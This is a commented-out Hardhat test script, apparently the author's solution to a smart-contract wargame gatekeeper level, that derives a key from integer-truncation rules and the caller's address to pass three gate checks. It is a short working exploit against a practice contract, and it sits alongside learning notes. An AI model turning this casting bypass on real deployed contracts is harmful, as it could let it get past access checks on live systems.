// const { expect } = require("chai");
// const { Contract } = require("ethers");
// const { ethers } = require("hardhat");


// // uint8  : 0-255 = 2^8 - 1
// // uint16 : 0-    = 2^16 - 1
// // uint32 : 0-    = 2^32 - 1
// // uint64 : 0-    = 2^64 - 1



// describe("Unlock", function () {
//   it("Unlock", async function () {
//     const [owner] = await ethers.getSigners();

//     const HackGateOne = await ethers.getContractFactory("HackGateOne");
//     const hackgateone = await HackGateOne.attach("0x13774defBe70215643f8673932275EFb269FD220");

//     // 1940 gas spent between gate one and gate two
//     // some gas spent to call external contract

// // Gate 1: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)
// // this means that the 16int form of the key is equal to the 32int form
// // means in the 16int is the max that the key can be, it can not be bigger
// // then the 32int

// // what if between 16 and 32? wrong assumption haah
// // - if greater than u16, conversion will revert back to 0, and go up from there
// // - if less than u32, it will keep the same

// // next hypothesis: get a number greater than 32
// // but when it reverts will be less than u16

//     // const res64 = 4294967296
//     // const res32 = await hackgateone.get32(res64)
//     // console.log(res32)

//     // const res16 = await hackgateone.get16(res64)
//     // console.log(res16)


// // if need to be greater than 32, the 32 cast will cut it down to u32, and the 
// // u16 cast will cut it down to u16
  
//     // const res8add = await hackgateone.get8(owner.address.concat("000000000000000000000000"))
//     // console.log(res8add)
//     const res8add = "0x000000000000a7d9" // pass gate 1

//     // const res64 = await hackgateone.get64(res8add)
//     // console.log(res64)

//     // const res32 = await hackgateone.get32(res64)
//     // console.log(res32)

//     // const res16 = await hackgateone.get16(res64)
//     // console.log(res16)

//     // Convert back from uint16 to uint64 to bytes8
//     // const res64_16 = await hackgateone.get64_16(res16)
//     // console.log(res64_16)

//     // Convert back from uint64 to bytes8
//     // const res8_64 = await hackgateone.get_bytes_from_64(res64_16)
//     // console.log(res8_64)


// /// Gate 2: uint32(uint64(_gateKey)) != uint64(_gateKey)
// // means the 32int form is not equal to the 64int, but still equal to the 16int form
// // means the key need to be greater than u32, so the u32 cast will cut it down



// /// Gate 3: uint32(uint64(_gateKey)) == uint16(tx.origin)
// /// means the 32u form is same as 16u form of my address
//     // console.log(owner.address)
//     // const res16add = await hackgateone.get16add(owner.address)
//     // console.log(res16add)
//     // 54498





//     // const key = owner.address.concat("000000000000000000000000");
//     const key = 4294967296 + 54498;
//     console.log(key)
//     const res = await hackgateone.hack(key);
//     const out = await res.wait();
//     console.log(out)
    

//     // const res = await hackgateone.entrant();
//     // console.log(res)

//   }
// )});
